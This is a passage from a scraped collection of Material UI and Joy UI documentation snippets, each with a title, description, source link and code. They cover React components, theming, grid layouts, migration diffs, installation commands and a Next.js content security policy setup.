value=\"checkedA\" inputProps={{ 'aria-label': 'Switch A' }} />\n```\n\n----------------------------------------\n\nTITLE: Centering Content in Grid Items\nDESCRIPTION: Implementation showing how to center content within grid items by using display=\"flex\" with justifyContent and alignItems properties.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/grid/grid.md#2025-04-22_snippet_13\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"ChildrenCenteredGrid.js\"}\n```\n\n----------------------------------------\n\nTITLE: Column Header Grouping in React Table\nDESCRIPTION: Example of implementing grouped column headers in a table by using multiple TableRow components within TableHead.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/table/table.md#2025-04-22_snippet_1\n\nLANGUAGE: JSX\nCODE:\n```\n<TableHead>\n  <TableRow />\n  <TableRow />\n</TableHead>\n```\n\n----------------------------------------\n\nTITLE: Migrating from LoadingButton to Button in Material UI v6\nDESCRIPTION: Updates to import statements when migrating from the Lab's LoadingButton to the standard Button component, which now includes loading functionality in v6.4.0+.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_16\n\nLANGUAGE: diff\nCODE:\n```\n-import { LoadingButton } from '@mui/lab';\n+import { Button } from '@mui/material';\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI Next.js Dependencies for Pages Router with pnpm\nDESCRIPTION: Command to install the required dependencies for integrating Material UI with Next.js Pages Router using pnpm package manager.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\npnpm add @mui/material-nextjs @emotion/cache @emotion/server\n```\n\n----------------------------------------\n\nTITLE: Creating Slider with Minimum Distance in React\nDESCRIPTION: Shows how to enforce a minimum distance between values in a range slider using the 'onChange' event handler in Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/slider/slider.md#2025-04-22_snippet_8\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"MinimumDistanceSlider.js\"}\n```\n\n----------------------------------------\n\nTITLE: Enabling Telemetry in MUI X\nDESCRIPTION: This code snippet demonstrates how to opt-in to MUI X telemetry by importing the muiXTelemetrySettings object from the @mui/x-license package and calling the enableTelemetry method. This should be added close to license validation in the project.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v8.md#2025-04-22_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nimport { muiXTelemetrySettings } from '@mui/x-license';\n\nmuiXTelemetrySettings.enableTelemetry();\n```\n\n----------------------------------------\n\nTITLE: Applying Inline Margin using the sx Prop in MUI (JSX)\nDESCRIPTION: Demonstrates using the `sx` prop on an MUI `Slider` component to apply vertical margin directly. The `my: 1` corresponds to `margin-top: theme.spacing(1)` and `margin-bottom: theme.spacing(1)`, which typically defaults to 8px.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-core-v5.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n// add margin: 8px 0px;\n<Slider sx={{ my: 1 }} />\n```\n\n----------------------------------------\n\nTITLE: Setting Max-Width with Material-UI Box Component\nDESCRIPTION: Shows how to set a max-width constraint using a breakpoint value from the theme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/sizing/sizing.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ maxWidth: 'md' }}>…\n```\n\n----------------------------------------\n\nTITLE: Customizing Tabs Scroll Buttons with CSS\nDESCRIPTION: CSS customization to control the opacity of disabled scroll buttons in Tabs component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/tabs/tabs.md#2025-04-22_snippet_1\n\nLANGUAGE: css\nCODE:\n```\n.MuiTabs-scrollButtons.Mui-disabled {\n  opacity: 0.3;\n}\n```\n\n----------------------------------------\n\nTITLE: Removing span wrapper from ToggleButton in HTML\nDESCRIPTION: Removes the span element that wraps children and the label classKey from ToggleButton component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_44\n\nLANGUAGE: diff\nCODE:\n```\n  <button class=\"MuiToggleButton-root\">\n-  <span class=\"MuiToggleButton-label\">\n      {children}\n-  </span>\n  </button>\n```\n\n----------------------------------------\n\nTITLE: Creating Active Last Breadcrumb in React\nDESCRIPTION: Shows how to keep the last breadcrumb interactive in a React application. This is useful for maintaining navigation functionality on the current page.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/breadcrumbs/breadcrumbs.md#2025-04-22_snippet_1\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"ActiveLastBreadcrumb.js\"}\n```\n\n----------------------------------------\n\nTITLE: Importing Stepper Components in React\nDESCRIPTION: This snippet shows how to import the basic Stepper and Step components from Joy UI. These are the fundamental building blocks for creating a stepper in your React application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/stepper/stepper.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Stepper from '@mui/joy/Stepper';\nimport Step from '@mui/joy/Step';\n```\n\n----------------------------------------\n\nTITLE: Auto-Layout Grid Implementation\nDESCRIPTION: Auto-layout configuration that makes grid items share available space equitably, allowing one item's width to be set while others automatically resize.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/grid/grid.md#2025-04-22_snippet_7\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"AutoGrid.js\", \"bg\": true}\n```\n\n----------------------------------------\n\nTITLE: Forwarding Refs to Material UI Button Component with React.forwardRef in JSX\nDESCRIPTION: This snippet illustrates how to forward a React ref to a Material UI Button component, enabling direct access to the underlying DOM node. It uses React.useRef to create the reference, which is passed as the ref prop, following the React.forwardRef API. Dependencies: React (>=16.8.0) and @mui/material.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v4-is-out.md#2025-04-22_snippet_4\n\nLANGUAGE: JSX\nCODE:\n```\nimport { Button } from '@mui/material';\n\nfunction MyButton() {\n  const myRef = React.useRef();\n\n  return <Button ref={myRef}>;\n}\n```\n\n----------------------------------------\n\nTITLE: Migrating from Deprecated Grid to GridLegacy\nDESCRIPTION: Diff showing how to update imports, class names, and theme customization when continuing to use the deprecated Grid component (now renamed to GridLegacy).\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_7\n\nLANGUAGE: diff\nCODE:\n```\n    // imports\n-import Grid, { gridClasses, GridProps } from '@mui/material/Grid';\n+import Grid, { gridLegacyClasses, GridLegacyProps } from '@mui/material/GridLegacy';\n\n-import { Grid } from '@mui/material';\n+import { GridLegacy as Grid } from '@mui/material';\n\n    // theme\n    const theme = createTheme({\n      components: {\n-    MuiGrid: {\n+    MuiGridLegacy: {\n          // ...\n        },\n      },\n    });\n\n    // CSS classes\n-.MuiGrid-root\n+.MuiGridLegacy-root\n```\n\n----------------------------------------\n\nTITLE: Generating the Full HTML Page Template with Injected Components and CSS\nDESCRIPTION: Defines the HTML template that will be sent to the client. The server-rendered component HTML and extracted CSS are injected into this template, along with required meta tags and font resources.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/server-rendering/server-rendering.md#2025-04-22_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nfunction renderFullPage(html, css) {\n  return `\n    <!DOCTYPE html>\n    <html>\n      <head>\n        <meta charset=\"utf-8\" />\n        <title>My page</title>\n        ${css}\n        <meta name=\"viewport\" content=\"initial-scale=1, width=device-width\" />\n        <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n        <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin />\n        <link\n          rel=\"stylesheet\"\n          href=\"https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap\"\n        />\n      </head>\n      <body>\n        <div id=\"root\">${html}</div>\n      </body>\n    </html>\n  `;\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Flex Item Order with Material-UI Box Component in JSX\nDESCRIPTION: Demonstrates how to control the order in which flex items appear in the flex container using the order property. Higher values appear later in the visual order.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/flexbox/flexbox.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ order: 2 }}>Item 1</Box>\n<Box sx={{ order: 3 }}>Item 2</Box>\n<Box sx={{ order: 1 }}>Item 3</Box>\n```\n\n----------------------------------------\n\nTITLE: Customizing transition durations in MUI theme\nDESCRIPTION: Example of how to customize transition duration values in the Material-UI theme. Shows all default duration values in milliseconds that can be overridden or extended.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/transitions/transitions.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst theme = createTheme({\n  transitions: {\n    duration: {\n      shortest: 150,\n      shorter: 200,\n      short: 250,\n      // most basic recommended timing\n      standard: 300,\n      // this is to be used in complex animations\n      complex: 375,\n      // recommended when something is entering screen\n      enteringScreen: 225,\n      // recommended when something is leaving screen\n      leavingScreen: 195,\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring Media Query-Based Color Scheme in Joy UI\nDESCRIPTION: Sets up a theme using the media query-based color scheme selector instead of the default data attribute approach. This allows the application to respond to the user's system preferences using @media (prefers-color-scheme).\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/dark-mode/dark-mode.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport { extendTheme } from '@mui/joy/styles';\n\nconst theme = extendTheme({\n  colorSchemeSelector: 'media',\n});\n\nfunction App() {\n  return <CssVarsProvider theme={theme}>...</CssVarsProvider>;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Value Normalization for Progress Components in React\nDESCRIPTION: Function to normalize values from any range to 0-100 scale for progress components. Includes a React component example that uses the normalization function for both circular and linear progress indicators.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/progress/progress.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n// MIN = Minimum expected value\n// MAX = Maximum expected value\n// Function to normalise the values (MIN / MAX could be integrated)\nconst normalise = (value) => ((value - MIN) * 100) / (MAX - MIN);\n\n// Example component that utilizes the `normalise` function at the point of render.\nfunction Progress(props) {\n  return (\n    <React.Fragment>\n      <CircularProgress variant=\"determinate\" value={normalise(props.value)} />\n      <LinearProgress variant=\"determinate\" value={normalise(props.value)} />\n    </React.Fragment>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing System Preference Based Dark Mode\nDESCRIPTION: Shows how to enable built-in support for system color scheme preferences using the colorSchemes API.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/dark-mode/dark-mode.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nimport { ThemeProvider, createTheme } from '@mui/material/styles';\n\nconst theme = createTheme({\n  colorSchemes: {\n    dark: true,\n  },\n});\n\nfunction App() {\n  return <ThemeProvider theme={theme}>...</ThemeProvider>;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Nested Grids with Material UI Grid v2 (JavaScript)\nDESCRIPTION: Example showing how to create nested grid structures using Material UI's Grid v2 (`Unstable_Grid2`). Inner grid containers automatically inherit `spacing` from their parent container unless explicitly overridden, resolving a limitation of Grid v1.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/build-layouts-faster-with-grid-v2.md#2025-04-22_snippet_6\n\nLANGUAGE: js\nCODE:\n```\nimport Grid from '@mui/material/Unstable_Grid2';\n\n// root grid container\n<Grid container spacing={2}>\n  <Grid>...</Grid>\n  <Grid container>\n    {/* inherits spacing from the root container */}\n    <Grid>...</Grid>\n    <Grid>...</Grid>\n  </Grid>\n  <Grid>...</Grid>\n</Grid>;\n```\n\n----------------------------------------\n\nTITLE: Migrating Dynamic Styles in Styled Components\nDESCRIPTION: This snippet demonstrates how to migrate dynamic styles based on props in styled components to use CSS variables with a wrapper component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_21\n\nLANGUAGE: javascript\nCODE:\n```\nconst FlashCode = styled('div')(\n  ({ theme, startLine = 0, endLine = startLine, lineHeight = '0.75rem' }) => ({\n    top: `calc(${lineHeight} * 1.5 * ${startLine})`,\n    height: `calc(${lineHeight} * 1.5 * ${endLine - startLine + 1})`,\n    ...theme.typography.caption,\n  }),\n);\n\nexport default FlashCode;\n```\n\nLANGUAGE: javascript\nCODE:\n```\nconst FlashCodeRoot = styled('div')(({ theme }) => ({\n  top: `calc(var(--Flashcode-lineHeight) * 1.5 * var(--Flashcode-startLine))`,\n  height: `calc(var(--Flashcode-lineHeight) * 1.5 * (var(--Flashcode-endLine) - var(--Flashcode-startLine) + 1))`,\n  ...theme.typography.caption,\n}));\n\nconst FlashCode = React.forwardRef(function FlashCode(props, ref) {\n  const {\n    children,\n    startLine = 0,\n    endLine = startLine,\n    lineHeight = '0.75rem',\n    ...other\n  } = props;\n\n  return (\n    <FlashCodeRoot\n      ref={ref}\n      {...other}\n      style={{\n        '--Flashcode-lineHeight': lineHeight,\n        '--Flashcode-startLine': startLine,\n        '--Flashcode-endLine': endLine,\n        ...other.style,\n      }}\n    >\n      {children}\n    </FlashCodeRoot>\n  );\n});\n\nexport default FlashCode;\n```\n\n----------------------------------------\n\nTITLE: Implementing Simple Backdrop with Circular Progress in React\nDESCRIPTION: This code snippet demonstrates a basic implementation of the Backdrop component with a Circular Progress indicator. It shows how to create a button that toggles the visibility of the Backdrop and how to handle its closure.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/backdrop/backdrop.md#2025-04-22_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nSimpleBackdrop.js\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic Rating in React with Material-UI\nDESCRIPTION: Demonstrates the basic usage of the Rating component. This snippet shows how to render a simple rating control.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/rating/rating.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"BasicRating.js\"}\n```\n\n----------------------------------------\n\nTITLE: Adding Custom Component to Material UI Theme Types\nDESCRIPTION: This TypeScript code adds the custom Stat component to the Material UI theme types, enabling proper type checking and autocompletion for theme customization.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/creating-themed-components/creating-themed-components.md#2025-04-22_snippet_6\n\nLANGUAGE: typescript\nCODE:\n```\nimport {\n  ComponentsOverrides,\n  ComponentsVariants,\n  Theme as MuiTheme,\n} from '@mui/material/styles';\nimport { StatProps } from 'path/to/Stat';\n\ntype Theme = Omit<MuiTheme, 'components'>;\n\ndeclare module '@mui/material/styles' {\n  interface ComponentNameToClassKey {\n    MuiStat: 'root' | 'value' | 'unit';\n  }\n\n  interface ComponentsPropsList {\n    MuiStat: Partial<StatProps>;\n  }\n\n  interface Components {\n    MuiStat?: {\n      defaultProps?: ComponentsPropsList['MuiStat'];\n      styleOverrides?: ComponentsOverrides<Theme>['MuiStat'];\n      variants?: ComponentsVariants['MuiStat'];\n    };\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Applying Theme Shadows with sx Prop in Material UI JSX\nDESCRIPTION: Demonstrates applying a box shadow using a numeric index corresponding to the `theme.shadows` array via the `boxShadow` key in the `sx` prop. This leverages the predefined elevation shadows in the theme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_8\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ boxShadow: 1 }} />\n// equivalent to boxShadow: theme => theme.shadows[1]\n```\n\n----------------------------------------\n\nTITLE: Handling Click Events in React Button Component\nDESCRIPTION: Demonstrates how to handle click events on a Button component using the onClick prop. This example shows a simple alert being triggered when the button is clicked.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/buttons/buttons.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\n<Button\n  onClick={() => {\n    alert('clicked');\n  }}\n>\n  Click me\n</Button>\n```\n\n----------------------------------------\n\nTITLE: Using Divider with aria-hidden Attribute in React\nDESCRIPTION: This code demonstrates how to use the Divider component with the aria-hidden attribute for improved accessibility when used as a purely stylistic element.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/dividers/dividers.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Divider aria-hidden=\"true\" />\n```\n\n----------------------------------------\n\nTITLE: Basic Slider Implementation in Joy UI\nDESCRIPTION: Demonstrates the basic usage of the Slider component from Joy UI. The example shows how to import the component and implement a slider with a default value of 3 and a maximum value of 10.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/slider/slider.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Slider from '@mui/joy/Slider';\n\nexport default function MyApp() {\n  return <Slider defaultValue={3} max={10} />;\n}\n```\n\n----------------------------------------\n\nTITLE: React Value Memoization Example\nDESCRIPTION: Demonstrates proper value handling in controlled Autocomplete components using useMemo to ensure referential stability of filtered values.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/autocomplete/autocomplete.md#2025-04-22_snippet_2\n\nLANGUAGE: typescript\nCODE:\n```\n// ⚠️ BAD\nreturn <Autocomplete multiple value={allValues.filter((v) => v.selected)} />;\n\n// 👍 GOOD\nconst selectedValues = React.useMemo(\n  () => allValues.filter((v) => v.selected),\n  [allValues],\n);\nreturn <Autocomplete multiple value={selectedValues} />;\n```\n\n----------------------------------------\n\nTITLE: Implementing a Mobile Stepper with Text in React\nDESCRIPTION: This code shows how to create a mobile stepper with text display. It uses the MobileStepper component and includes buttons for navigation between steps. The current step and total steps are displayed as text.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/steppers/steppers.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<MobileStepper\n  variant=\"text\"\n  steps={maxSteps}\n  position=\"static\"\n  activeStep={activeStep}\n  nextButton={\n    <Button\n      size=\"small\"\n      onClick={handleNext}\n      disabled={activeStep === maxSteps - 1}\n    >\n      Next\n      {theme.direction === 'rtl' ? (\n        <KeyboardArrowLeft />\n      ) : (\n        <KeyboardArrowRight />\n      )}\n    </Button>\n  }\n  backButton={\n    <Button size=\"small\" onClick={handleBack} disabled={activeStep === 0}>\n      {theme.direction === 'rtl' ? (\n        <KeyboardArrowRight />\n      ) : (\n        <KeyboardArrowLeft />\n      )}\n      Back\n    </Button>\n  }\n/>\n```\n\n----------------------------------------\n\nTITLE: Importing and Using Material Color Values\nDESCRIPTION: Example of importing specific colors from Material-UI's color palette and accessing their values using different notation methods.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/color/color.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nimport { purple, red } from '@mui/material/colors';\n\nconst primary = red[500]; // #f44336\nconst accent = purple['A200']; // #e040fb\nconst accent = purple.A200; // #e040fb (alternative method)\n```\n\n----------------------------------------\n\nTITLE: Customizing Avatar Image Slot with Next.js\nDESCRIPTION: TypeScript example showing how to customize the Avatar component's img slot using Next.js Image component with proper type safety.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/overriding-component-structure/overriding-component-structure.md#2025-04-22_snippet_2\n\nLANGUAGE: tsx\nCODE:\n```\nimport Image, { ImageProps } from 'next/image';\nimport Avatar, { AvatarProps } from '@mui/material/Avatar';\n\n<Avatar\n  slots={{\n    img: Image,\n  }}\n  slotProps={\n    {\n      img: {\n        src: 'https://example.com/image.jpg',\n        alt: 'Image',\n        width: 40,\n        height: 40,\n        blurDataURL: 'data:image/png;base64',\n      } satisfies ImageProps,\n    } as AvatarProps['slotProps']\n  }\n/>;\n```\n\n----------------------------------------\n\nTITLE: Importing Divider Component in React\nDESCRIPTION: This snippet shows how to import the Divider component from Material UI in a React application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/dividers/dividers.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Divider from '@mui/material/Divider';\n```\n\n----------------------------------------\n\nTITLE: Setting up Joy UI and Material UI Providers\nDESCRIPTION: Demonstrates how to properly nest Joy UI's CssVarsProvider inside Material UI's ThemeProvider using THEME_ID for theme separation. Shows the basic provider setup with CssBaseline component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/integrations/material-ui/material-ui.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport {\n  createTheme,\n  ThemeProvider,\n  THEME_ID as MATERIAL_THEME_ID,\n} from '@mui/material/styles';\nimport { CssVarsProvider as JoyCssVarsProvider } from '@mui/joy/styles';\nimport CssBaseline from '@mui/material/CssBaseline';\n\nconst materialTheme = createTheme();\n\nexport default function App() {\n  return (\n    <ThemeProvider theme={{ [MATERIAL_THEME_ID]: materialTheme }}>\n      <JoyCssVarsProvider>\n        <CssBaseline enableColorScheme />\n        ...Material UI and Joy UI components\n      </JoyCssVarsProvider>\n    </ThemeProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: CSS z-index Values for Material UI Components\nDESCRIPTION: Default z-index values used by various Material UI components to ensure proper stacking order in the UI. These values start at 1000 and can be customized through the theme's zIndex key.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/z-index/z-index.md#2025-04-22_snippet_0\n\nLANGUAGE: css\nCODE:\n```\nmobile stepper { z-index: 1000; }\nfab { z-index: 1050; }\nspeed dial { z-index: 1050; }\napp bar { z-index: 1100; }\ndrawer { z-index: 1200; }\nmodal { z-index: 1300; }\nsnackbar { z-index: 1400; }\ntooltip { z-index: 1500; }\n```\n\n----------------------------------------\n\nTITLE: Variable Width Content Grid\nDESCRIPTION: Grid implementation where size is set to \"auto\" for certain breakpoints to allow column width to be based on natural content width.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/grid/grid.md#2025-04-22_snippet_8\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"VariableWidthGrid.js\", \"bg\": true}\n```\n\n----------------------------------------\n\nTITLE: Adjusting Rating Size in React with Material-UI\nDESCRIPTION: Demonstrates how to change the size of the Rating component using the size prop. This allows for larger or smaller ratings as needed.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/rating/rating.md#2025-04-22_snippet_3\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"RatingSize.js\"}\n```\n\n----------------------------------------\n\nTITLE: Implementing CSP in Next.js Pages Router _document.tsx\nDESCRIPTION: Implementation of CSP nonce in Next.js _document.tsx file, including setting up document head tags and initial props with the nonce value.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/content-security-policy/content-security-policy.md#2025-04-22_snippet_5\n\nLANGUAGE: tsx\nCODE:\n```\nimport {\n  DocumentHeadTags,\n  documentGetInitialProps,\n  createEmotionCache,\n} from '@mui/material-nextjs/v15-pagesRouter';\n// other imports\n\ntype Props = DocumentInitialProps & DocumentHeadTagsProps & { nonce?: string };\n\nexport default function MyDocument(props: Props) {\n  const { nonce } = props;\n\n  return (\n    <Html lang=\"en\" className={roboto.className}>\n      <Head>\n        {/*...*/}\n        <meta name=\"csp-nonce\" content={nonce} />\n        <DocumentHeadTags {...props} nonce={nonce} />\n      </Head>\n      <body>\n        {/*...*/}\n        <NextScript nonce={nonce} />\n      </body>\n    </Html>\n  );\n}\n\nMyDocument.getInitialProps = async (ctx: DocumentContext) => {\n  const { req } = ctx;\n  const nonce = req?.headers['x-nonce'];\n  if (typeof nonce !== 'string') {\n    throw new Error('\"nonce\" header is missing');\n  }\n\n  const emotionCache = createEmotionCache({ nonce });\n  const finalProps = await documentGetInitialProps(ctx, {\n    emotionCache,\n  });\n\n  return { ...finalProps, nonce };\n};\n```\n\n----------------------------------------\n\nTITLE: Implementing Collapsed Breadcrumbs in React\nDESCRIPTION: Demonstrates how to create collapsed breadcrumbs, useful for managing long navigation paths in a compact format.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/breadcrumbs/breadcrumbs.md#2025-04-22_snippet_4\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"CollapsedBreadcrumbs.js\"}\n```\n\n----------------------------------------\n\nTITLE: Installing and Running the Gatsby Example\nDESCRIPTION: Commands to install the project dependencies and start the development server for the Material UI Gatsby example.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-gatsby/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm run develop\n```\n\n----------------------------------------\n\nTITLE: Applying Mode-Specific Styles using theme.applyStyles in JSX\nDESCRIPTION: This snippet compares the previous method of applying dark mode styles (checking `theme.palette.mode`) with the new `theme.applyStyles('dark', { ... })` API in Material UI v6. The 'After' example shows using `theme.applyStyles` within a styled component to define styles specifically for dark mode, which helps prevent SSR flickering when used with CSS variables.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v6-is-out.md#2025-04-22_snippet_8\n\nLANGUAGE: jsx\nCODE:\n```\nconst StyledInput = styled(InputBase)(({ theme }) => ({\n  padding: 10,\n  width: '100%',\n  borderBottom: '1px solid #eaecef',\n  ...theme.applyStyles('dark', {\n    borderBottom: '1px solid #30363d',\n  }),\n  '& input': {\n    borderRadius: 4,\n    backgroundColor: '#fff',\n    ...theme.applyStyles('dark', {\n      backgroundColor: '#0d1117',\n    }),\n  },\n}));\n```\n\nLANGUAGE: jsx\nCODE:\n```\nconst StyledInput = styled(InputBase)(({ theme }) => ({\n  padding: 10,\n  width: '100%',\n  borderBottom:\n    theme.palette.mode === 'dark' ? '1px solid #30363d' : '1px solid #eaecef',\n  '& input': {\n    borderRadius: 4,\n    backgroundColor: theme.palette.mode === 'dark' ? '#0d1117' : '#fff',\n  },\n}));\n```\n\n----------------------------------------\n\nTITLE: Combining Objects and Callbacks in sx Prop Array (Material UI JSX)\nDESCRIPTION: Shows that elements within an `sx` prop array can be either plain style objects or callback functions that receive the theme. This allows mixing static styles, theme-dependent styles accessed via the callback, and conditional overrides within a single `sx` prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_20\n\nLANGUAGE: jsx\nCODE:\n```\n<Box\n  sx={[\n    { mr: 2, color: 'red' },\n    (theme) => ({\n      '&:hover': {\n        color: theme.palette.primary.main,\n      },\n    }),\n  ]}\n/>\n```\n\n----------------------------------------\n\nTITLE: Configuring Flexbox Gap for All Stack Instances (JavaScript)\nDESCRIPTION: Creates a theme that applies the useFlexGap prop to all Stack instances by default. This enables flexbox gap spacing implementation which removes some known limitations of the default implementation.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/stack/stack.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nimport { CssVarsProvider, extendTheme } from '@mui/joy/styles';\nimport Stack from '@mui/joy/Stack';\n\nconst theme = extendTheme({\n  components: {\n    JoyStack: {\n      defaultProps: {\n        useFlexGap: true,\n      },\n    },\n  },\n});\n\nfunction App() {\n  return (\n    <CssVarsProvider theme={theme}>\n      <Stack>…</Stack> {/* uses flexbox gap by default */}\n    </CssVarsProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Popper State Management with Popup State\nDESCRIPTION: Demonstrates using material-ui-popup-state library to manage Popper state with less boilerplate code.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/popper/popper.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport Typography from '@mui/material/Typography';\nimport Box from '@mui/material/Box';\nimport Popper from '@mui/material/Popper';\nimport PopupState, { bindToggle, bindPopper } from 'material-ui-popup-state';\n\nexport default function PopperPopupState() {\n  return (\n    <PopupState variant=\"popper\" popupId=\"demo-popup-popper\">\n      {(popupState) => (\n        <div>\n          <button variant=\"contained\" {...bindToggle(popupState)}>\n            Toggle Popper\n          </button>\n          <Popper {...bindPopper(popupState)} transition>\n            <Box sx={{ border: 1, p: 1, bgcolor: 'background.paper' }}>\n              <Typography sx={{ p: 2 }}>The content of the Popper.</Typography>\n            </Box>\n          </Popper>\n        </div>\n      )}\n    </PopupState>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Sizing Utilities from Material-UI System\nDESCRIPTION: Shows how to import sizing utilities from the Material-UI system package.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/sizing/sizing.md#2025-04-22_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nimport { sizing } from '@mui/system';\n```\n\n----------------------------------------\n\nTITLE: Using a Custom Tree Item in RichTreeView (JSX)\nDESCRIPTION: This example shows how to pass the previously defined CustomTreeItem component to the RichTreeView's slots prop for item rendering. It demonstrates how to swap out standard tree items in favor of fully customized behavior and styling using RichTreeView's composable slot API. The snippet expects a dataset (myDataSet) and a CustomTreeItem implementation and outputs a rendered tree with advanced item customization.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v7.md#2025-04-22_snippet_3\n\nLANGUAGE: JSX\nCODE:\n```\n<RichTreeView items={myDataSet} slots={{ item: CustomTreeItem }} />\n```\n\n----------------------------------------\n\nTITLE: Creating a Basic Stepper in React\nDESCRIPTION: This code demonstrates the basic usage of the 